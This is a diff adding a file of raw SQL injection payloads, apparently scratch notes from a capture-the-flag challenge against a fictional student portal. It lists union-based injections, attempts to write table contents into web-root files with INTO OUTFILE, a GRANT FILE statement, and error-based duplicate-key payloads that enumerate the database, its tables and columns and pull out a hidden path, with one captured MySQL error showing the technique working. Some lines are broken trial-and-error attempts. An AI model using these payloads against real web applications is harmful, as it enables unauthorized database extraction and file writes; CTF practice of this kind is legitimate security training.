@@ -1,0 +1,90 @@
+g' union select essay from users;#
+
+g' union select * from applications into outfile '/var/www/html/yes.txt';#
+
+g' union select * from applications into outfile '/var/www/website/public_html/yes.txt';#
+
+g' union select * from applications into outfile '/home/mysql/yes.txt';#
+
+g' union select * from applications into outfile '../file.txt';#
+
+g' union select * from applications;#
+
+g' union select * from applications into outfile '/tmp/waw.txt';#
+
+g' union select * from applications into outfile '/var/www/html/studentportal.elfu.org/yes.txt';#
+
+
+
+g' union  mysqldump -u elfu -p --all-databases > /db-dumps/dump1;#
+
+
+
+GRANT FILE ON *.* TO 'elfu'@'%';
+
+
+
+
+GRANT FILE ON *.* TO 'elfu'@'%';
+
+
+*' into outfile '/var/www/html/studentportal.elfu.org/yes.txt';#
+
+*' into outfile ${HOME}/text;#
+
+
+g' union select * from applications into outfile /tmp/file.txt;#
+
+g' UNION ALL SELECT NULL,version();#
+
+g' order by 1 UNION ALL SELECT NULL,version();#
+
+*' order by 1 ;#
+
+g' and (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x);#
+
+Warning: mysqli::query(): (23000/1062): Duplicate entry 'elfu:1' for key 'group_key' in /var/www/html/application-check.php on line 73
+Error: SELECT status FROM applications WHERE elfmail = 'g' or (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x);#';
+Duplicate entry 'elfu:1' for key 'group_key'
+
+
+test@test.com' and (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x);#
+
+
+
+
+
+
+
+
+test@test.com' and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
+
+
+
+
+
+0' AND (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT whyme from applications where elfmail='test4@test.com' ORDER BY id DESC LIMIT 1), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) - - '
+
+0' AND (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT phone from applications where elfmail='krampus@elfu.org' into outfile /var/www/html/yes.txt), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) - - '
+
+
+0' AND (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT CAST(whyme as CHAR(200)) from applications where elfmail='krampus@elfu.org'), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) - - '
+
+
+GET TABLES
+
+0' AND (SELECT 0 FROM (SELECT count(*), CONCAT((select table_name from information_schema.tables where table_schema=database() limit 1,1), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) - - '
+
+
+
+
+
+GET COLUMNS
+
+0' AND (SELECT 0 FROM (SELECT count(*), CONCAT((select column_name from information_schema.columns where table_schema=database() and table_name='krampus' limit 2,1), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) - - '
+
+GET KRAMPUS PATH
+0' AND (SELECT 0 FROM (SELECT count(*), CONCAT((select path from krampus where id=7), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) - - '
+
+
+
